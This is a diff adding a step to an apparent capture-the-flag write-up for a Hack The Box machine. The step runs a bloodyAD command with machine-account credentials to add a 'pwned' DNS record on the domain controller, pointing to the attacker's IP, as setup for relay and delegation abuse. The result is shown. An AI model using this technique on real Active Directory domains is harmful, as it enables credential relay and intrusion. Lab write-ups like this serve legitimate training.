@@ -440,7 +440,19 @@ Now this isnt really a hash, i can try to convert it with a tool then try to cra
 
 I think the better plan is to replace responder with a relay that executes a command
 
+# Using relay to setup delegation
 
+```python
+bloodyAD --host dc01.pirate.htb -d pirate.htb -u 'ms01$' -p 'ms01' -k add dnsRecord pwned 10.10.14.61
+Clock skew detected. Adjusting local time by 7:00:00.217305. Retrying operation.
+[+] pwned has been successfully added
+```
+
+First ill add the DNS record to the domain controller, with my IP address
+
+```python
+
+```
 
 
 
